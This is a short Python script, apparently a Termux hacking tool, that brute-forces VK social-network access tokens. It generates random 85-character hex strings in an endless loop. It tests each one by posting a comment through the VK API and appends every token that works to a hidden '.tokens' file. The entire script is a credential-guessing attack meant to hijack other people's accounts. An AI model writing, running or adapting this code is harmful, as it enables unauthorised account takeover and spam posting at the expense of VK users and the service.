import random, vk, os
os.system("clear")
symbols = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
print ("""
 \033[37mTermux-Lab           @termuxlab\033[32m
 ┏━━━━━┳━━━━━┳━━┳━━┳━━━━━┳━━━━━┓
 ┃  ━  ┫  ━  ┃  ┃  ┣━┓ ┏━┫  ━━━┫
 ┃  ━  ┃     ┫     ┃ ┃ ┃ ┃  ━━━┫
 ┗━━━━━┻━━┻━━┻━━━━━┛ ┗━┛ ┗━━━━━┛
\n\n""")

while True:
	token = ''
	for lap in range(85):
		token += symbols[random.randint(0,15)]
	session = vk.Session(access_token=token)
	api = vk.API(session ,v='5.92', lang='ru')
	try:
		api.wall.createComment(owner_id=-191163638,post_id=1,message="НЕ ДАМ ТОКЕН")
		print ("\033[F\033[F\033[32m" + token + "\n\n")
		f = open ('.tokens','a+')
		f.write(token + "\n")
		f.close
	except:
		print ("\033[F\033[F\033[31m" + token)
